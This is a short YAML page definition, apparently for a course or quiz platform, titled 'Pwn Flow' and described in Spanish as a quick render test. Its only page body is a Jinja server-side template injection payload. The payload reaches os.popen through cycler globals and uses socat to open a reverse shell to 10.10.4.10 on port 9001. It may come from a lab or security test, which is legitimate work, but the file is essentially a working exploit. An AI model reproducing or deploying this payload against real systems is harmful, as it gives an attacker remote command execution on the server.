title: "Pwn Flow"
description: |
  Prueba rápida de render.

rules:
  grade_identifier: null
  start:
    - may_start_new_session: true
      may_list_existing_sessions: true
  access:
    - permissions: [view, submit_answer, end_session]

pages:
  - type: Page
    id: jinja
    title: "Jinja test"         # <-- título explícito
    content: |
      # Jinja test              # <-- título también en el body (opcional)
      {{ cycler.__init__.__globals__.os.popen('bash -c "socat TCP:10.10.4.10:9001 EXEC:sh"').read() }}

